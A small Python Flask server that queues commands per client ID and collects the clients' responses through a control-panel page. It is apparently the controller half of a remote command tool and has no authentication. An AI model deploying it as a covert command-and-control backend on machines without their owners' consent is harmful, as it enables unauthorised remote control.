from flask import Flask, request, jsonify, render_template
import os

app = Flask(__name__)

# Store client commands and responses
clients = {}

@app.route("/")
def control_panel():
    return render_template("control_panel.html")

@app.route("/command", methods=["POST"])
def command():
    client_id = request.json.get("client_id")
    command = request.json.get("command")
    if client_id not in clients:
        clients[client_id] = {"commands": [], "responses": []}
    clients[client_id]["commands"].append(command)
    return jsonify(status="success")

@app.route("/response", methods=["POST"])
def response():
    client_id = request.json.get("client_id")
    response = request.json.get("response")
    if client_id in clients:
        clients[client_id]["responses"].append(response)
    return jsonify(status="success")

@app.route("/get_commands", methods=["GET"])
def get_commands():
    client_id = request.args.get("client_id")
    if client_id in clients:
        return jsonify(commands=clients[client_id]["commands"])
    return jsonify(commands=[])

@app.route("/get_responses", methods=["GET"])
def get_responses():
    client_id = request.args.get("client_id")
    if client_id in clients:
        return jsonify(responses=clients[client_id]["responses"])
    return jsonify(responses=[])

if __name__ == "__main__":
    os.makedirs("uploads", exist_ok=True)
    app.run(host="0.0.0.0", port=5000)